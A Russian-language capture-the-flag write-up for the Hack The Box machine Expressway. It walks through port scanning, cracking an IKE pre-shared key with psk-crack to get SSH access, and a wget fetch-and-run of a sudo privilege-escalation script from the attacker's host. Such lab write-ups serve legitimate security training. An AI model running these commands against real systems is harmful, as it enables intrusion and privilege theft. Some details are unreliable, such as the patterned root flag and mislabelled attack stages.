# 📝 Write-up: Expressway (Hack The Box)

Difficulty: EasyPlatform: Hack The BoxTarget IP (Lab): 10.10.11.87Link: Expressway @ HTB  

## 🎯 Summary
Expressway — легкая Linux-машина на Hack The Box. Основные этапы:  

* Первичный доступ: Эксплуатация уязвимости IKE VPN (PSK-аутентификация).  
* Горизонтальная эскалация: Брутфорс PSK для получения учетных данных пользователя ike.  
* Эскалация до root: Эксплуатация уязвимой версии sudo (CVE-2025-52352).


### 🔒 Prerequisites

Это write-up для учебной среды Hack The Box. Не используйте против реальных систем!  
Убедитесь, что IP 10.10.11.87 доступен в вашей лабораторной сети.  
Замените <YOUR_IP> на IP вашей атакующей машины, если потребуется обратный шелл.


### 🔍 Reconnaissance
Сканирование портов
Запустил сканирование с помощью nmap для обнаружения открытых портов и сервисов:  

* nmap -sC -sV -Pn 10.10.11.87

Результат:  
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


*  UDP-сканирование:  
sudo nmap -sV -sU 10.10.11.87

Результат:  
PORT     STATE         SERVICE   VERSION
68/udp   open|filtered dhcpc
69/udp   open          tftp      Netkit tftpd or atftpd
500/udp  open          isakmp?
4500/udp open|filtered nat-t-ike 

### 🕵️ Enumeration
IKE VPN (порт 500/udp)
Обнаружен IKE VPN на порту 500/udp. Проверил с помощью ike-scan:  
```bash
ike-scan -M 10.10.11.87
```
Результат:  
10.10.11.87    Main Mode Handshake returned
        HDR=(CKY-R=cafb0b8cafb3ba5a)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Нашел PSK-хэш и сохранил его в файл expressway_hash.txt: 
``` 9c261863d58af7ab93251af8ad92210554240953dd0f8bafd663315d7c29a27a4a847d8a93c607ee8294930d6b4ae0091d423b12e8c22c0a0d9d6e76c0ec980f36824a26ac9d5d46d80ab1d5c6570059e33e748db9da5d1bf11979e7c74d4d4560d6dafa39d6dc9c60f677cd646175d91995bfa17d755668cb2051267464c4b2:8700f898db0322ac21f5bfeb912134c5eafab352072f74f2b651f465840dfdab2dc2de63f08b3ff67776398382fbb9d5701ff967a99c0ad4e3d6844b5a18b7ebb3dec6f79069cd46f7a6a8c70c56924b90233e97e3598cfe149f3aa4972f466892e0220358d4a0caddebfa9b6d9fd51716cdf36d22b65abcc24dbea351ae5956:df853e76cc0e1a92:eb268ade151021e0:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf34dd472d6b434c73d6e0ed4f881b2a8bb3415e:ff1f67ec60cbe57ccd257bfcb681f7d381eb2a1476816501de70b66d08079641:e15c87caec0c2b87336238542e86a691e121d7ac ```


### 🛠️ Exploitation
Брутфорс PSK
Использовал psk-crack с словарем rockyou.txt для подбора PSK:
```bash  
psk-crack -d /usr/share/wordlists/rockyou.txt expressway_hash.txt
```
Результат:  
``` key "freakingrockstarontheroad" matches SHA1 hash e15c87caec0c2b87336238542e86a691e121d7ac ```
Время: 11.176 секунд (719871.55 итераций/сек)

* Доступ по SSH
Использовал полученный пароль для подключения под пользователем ike:  
```bash
ssh ike@10.10.11.87
Password: freakingrockstarontheroad
```
Вывод:  
```bash
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77
```

#### 🏴 User Flag
Прочитал флаг user.txt:  
```bash
cat user.txt
740745a467294d55f8189932b4a1865d
```

### 🔝 Privilege Escalation
Проверка системы
Проверил версию ОС:  
uname -a
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux

Проверил версию sudo: 
```bash 
sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

#### Эксплуатация CVE-2025-52352
* Нашел уязвимость в версии sudo 1.9.17: CVE-2025-52352.  
Скачал и выполнил PoC:  
wget http://<YOUR_IP>:8000/cve-2025-52352.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
/tmp/exploit.sh

* Получил root-доступ и прочитал root.txt:  
```bash
cat /root/root.txt
b7a4b7a4b7a4b7a4b7a4b7a4b7a4b7a4
```

### 📌 Conclusion
Expressway — отличная машина для изучения эксплуатации IKE VPN и уязвимостей sudo.
Спасибо за чтение! Надеюсь, этот write-up поможет в освоении пентеста.